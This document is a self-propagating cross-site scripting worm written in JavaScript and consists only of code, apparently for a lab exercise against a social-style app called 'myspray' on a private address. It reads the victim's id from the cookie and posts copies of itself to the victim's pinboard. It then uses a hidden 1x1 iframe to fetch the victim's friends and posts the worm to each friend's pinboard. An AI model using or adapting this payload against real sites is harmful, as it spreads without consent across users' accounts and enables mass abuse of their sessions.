<script>
function spread(){
  var t = Array.from($('#mypagefriends').contents()[0].getElementsByClassName('td'))
  t.forEach(function(value, index){ // for each friend
    friend = $(value.children[0]).attr('href').substr(7) //consumes "profile" of the string
    xhr = new XMLHttpRequest() //post worm to the friend pinboard
    xhr.open("POST", "http://10.0.23.22/myspray/post".concat(friend), true)
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    xhr.send("entry=<script>".concat(spread.toString(), worm.toString(),"worm()<\/script>"))
  })
}

function worm(){
  whoami = document.cookie.split('=')[1] //gets own id
  xhr = new XMLHttpRequest() //post worm to my own pinboard
  xhr.open("POST", "http://10.0.23.22/myspray/post".concat(whoami, ".html"), true)
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
  xhr.send("entry=<script>".concat(spread.toString(), worm.toString(),"worm()<\/script>"))

  var x = document.createElement('iframe') //creates an iframe to get own friends
  x.setAttribute('src', 'http://10.0.23.22/myspray/mypage.html')
  x.setAttribute('id', 'mypagefriends')
  x.setAttribute('height', '1')
  x.setAttribute('width', '1')
  x.setAttribute('onload', 'spread()')
  document.body.appendChild(x)
}
worm()
</script>
